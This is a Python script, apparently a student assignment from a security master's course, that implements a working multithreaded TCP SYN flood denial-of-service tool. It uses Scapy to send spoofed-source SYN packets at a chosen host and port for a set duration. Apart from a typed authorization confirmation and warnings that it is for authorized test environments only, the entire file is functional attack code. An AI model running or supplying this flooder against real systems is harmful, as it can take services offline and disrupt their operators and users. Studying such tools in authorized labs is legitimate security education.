#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Master's in Computer Security Engineering
Dynamic Programming Languages - SYN Flooder

Author: Martinho Caeiro (23917)

Description:
    Sends TCP SYN packets to simulate a denial-of-service attack (SYN Flood/DoS).
    Uses Scapy for low-level packet crafting.

Usage:
    python3 syn_flooder.py [--target HOST] [--port PORT] [--duration SECONDS] [--threads N]

Example:
    python3 syn_flooder.py --target 192.168.1.1 --port 80 --duration 10
"""

import socket
import sys
import argparse
import time
import threading
import random
from datetime import datetime

def _ensure_package_local(package_name, import_name=None, prompt=True):
    """Minimal local helper to prompt+install a pip package at runtime."""
    import importlib
    import subprocess
    import sys as _sys

    mod_name = import_name or package_name
    try:
        return importlib.import_module(mod_name)
    except Exception:
        pass

    if not prompt:
        return None

    try:
        ans = input(f"Dependência '{package_name}' em falta. Instalar agora? [s/N]: ").strip().lower()
    except Exception:
        return None

    if ans not in ("", "s", "sim", "y", "yes"):
        return None

    cmd = [_sys.executable, "-m", "pip", "install", package_name]
    print(f"A executar: {' '.join(cmd)}")
    try:
        res = subprocess.run(cmd)
    except Exception as e:
        print(f"Falha ao executar o pip: {e}")
        return None

    if res.returncode != 0:
        print(f"pip install terminou com o código {res.returncode}")
        return None

    try:
        return importlib.import_module(mod_name)
    except Exception as e:
        print(f"Instalado, mas falhou ao importar {mod_name}: {e}")
        return None


    # Ensure Scapy is available
_ensure_package_local("scapy")

try:
    from scapy.IP import IP
    from scapy.TCP import TCP
    from scapy.layers.inet import IP as IP_Layer, TCP as TCP_Layer
    from scapy.all import send, IP as IP_Scapy, TCP as TCP_Scapy, RandShort
except ImportError:
    try:
        # Fallback for older Scapy versions
        from scapy.all import IP, TCP, send, RandShort
        IP_Scapy = IP
        TCP_Scapy = TCP
    except ImportError:
        print("Erro: Scapy não foi encontrada ou falhou a importação.")
        print("Instale com: pip install scapy")
        sys.exit(1)

    
# Section: SYN Flooder functions
    
def generate_random_ip():
    """Generate a random spoofed source IP address."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"


def generate_random_port():
    """Generate a random source port."""
    return random.randint(49152, 65535)


def syn_flood_worker(target, target_port, duration, packets_sent, lock):
    """Worker thread that sends TCP SYN packets to a target."""
    end_time = time.time() + duration
    count = 0

    try:
        while time.time() < end_time:
            # Random spoofed source IP
            src_ip = generate_random_ip()
            src_port = generate_random_port()

            # Build IP + TCP SYN packet
            try:
                packet = IP_Scapy(dst=target, src=src_ip) / TCP_Scapy(dport=target_port, sport=src_port, flags="S")
                
                # Send packet without waiting for response (send, not sr)
                send(packet, verbose=False)
                count += 1

                # Show progress every 500 packets
                if count % 500 == 0:
                    with lock:
                        print(f"  {count:,} pacotes SYN enviados para {target}:{target_port}")

            except Exception as e:
                print(f"  Erro ao enviar pacote: {e}")
                continue

    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("  ERRO: Este script requer privilégios de root/administrator para enviar pacotes raw!")
        print("     Execute com: sudo python3 syn_flooder.py ...")
        sys.exit(1)
    except Exception as e:
        print(f"  Erro: {e}")

    with lock:
        packets_sent.append(count)


def flood_target(target, target_port, duration, num_threads):
    """Send SYN flood with multiple threads."""
    print(f"\nIniciando SYN Flood (TCP)")
    print(f"   Alvo: {target}:{target_port}")
    print(f"   Duração: {duration} segundos")
    print(f"   Threads: {num_threads}")
    print(f"   Protocolo: TCP SYN (ligações half-open)")
    print("-" * 60)

    packets_sent = []
    threads = []
    lock = threading.Lock()
    t_start = time.time()

    try:
        # Create threads
        for i in range(num_threads):
            t = threading.Thread(
                target=syn_flood_worker,
                args=(target, target_port, duration, packets_sent, lock),
                daemon=True
            )
            t.start()
            threads.append(t)

        # Wait for threads
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("\nFlood interrompido pelo utilizador.")
    except PermissionError:
        print("\nERRO: Privilégios insuficientes!")
        print("Este script requer privilégios de root para manipular pacotes raw.")
        print("Execute com: sudo python3 syn_flooder.py ...")
        sys.exit(1)

    duration_real = time.time() - t_start
    total_packets = sum(packets_sent)
    pps = total_packets / duration_real if duration_real > 0 else 0

    print("\n" + "=" * 60)
    print("RELATÓRIO - SYN FLOOD")
    print("=" * 60)
    print(f"Alvo: {target}:{target_port}")
    print(f"Total de pacotes SYN enviados: {total_packets:,}")
    print(f"Taxa de envio: {pps:,.0f} pps (pacotes por segundo)")
    print(f"Duração real: {duration_real:.2f}s")
    print(f"Threads utilizadas: {num_threads}")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="SYN Flooder - Ataque de negação de serviço (DoS) via TCP SYN",
        epilog="Apenas para fins educacionais em ambientes autorizados. Requer root/administrator."
    )
    parser.add_argument("--target", "-t", help="Alvo (IP ou hostname)")
    parser.add_argument("--port", "-p", type=int, default=80, help="Porta TCP (default: 80/HTTP)")
    parser.add_argument("--duration", "-d", type=int, default=10, help="Duração em segundos (default: 10)")
    parser.add_argument("--threads", "-n", type=int, default=4, help="Número de threads (default: 4)")

    args = parser.parse_args()

    # If target was not provided, prompt
    if not args.target:
        args.target = input("Alvo (IP ou hostname): ").strip()
        if not args.target:
            print("Nenhum alvo fornecido. Abortando.")
            sys.exit(1)

    # Validations
    if args.port < 1 or args.port > 65535:
        print(f"Porta deve estar entre 1 e 65535")
        sys.exit(1)

    if args.duration < 1:
        print(f"Duração deve ser pelo menos 1 segundo")
        sys.exit(1)

    if args.threads < 1:
        print(f"Número de threads deve ser pelo menos 1")
        sys.exit(1)

    # Resolve hostname if needed
    try:
        target_ip = socket.gethostbyname(args.target)
        print(f"Alvo resolvido: {args.target} -> {target_ip}")
    except socket.gaierror:
        print(f"Não foi possível resolver {args.target}")
        sys.exit(1)

    # Determine service name
    service_name = "desconhecido"
    try:
        service_name = socket.getservbyport(args.port)
    except OSError:
        pass

    # Safety confirmation
    print("=" * 60)
    print("AVISO - ATAQUE SYN FLOOD (TCP)")
    print("=" * 60)
    print(f"Está prestes a enviar um ataque DoS para: {args.target}:{args.port} ({service_name})")
    print(f"Duração: {args.duration}s | Threads: {args.threads}")
    print("\nAVISOS IMPORTANTES:")
    print("  1. Este script requer privilégios de root/administrator")
    print("  2. Um ataque SYN Flood pode danificar infraestruturas críticas")
    print("  3. O uso não autorizado é ILEGAL em muitas jurisdições")
    print("  4. Utilize apenas em ambientes de teste autorizados")
    print("-" * 60)

    confirm = input("\nConfirma que tem autorização? (s/N): ").strip().lower()
    if confirm != "s" and confirm != "yes":
        print("Operação cancelada.")
        sys.exit(0)

    # Executar flood
    try:
        flood_target(target_ip, args.port, args.duration, args.threads)
    except PermissionError:
        print("\nERRO: Privilégios insuficientes!")
        print("Este script requer privilégios de root para manipular pacotes raw.")
        print("\nExecute com:")
        print(f"  sudo python3 syn_flooder.py --target {args.target} --port {args.port} --duration {args.duration}")
        sys.exit(1)


if __name__ == "__main__":
    main()
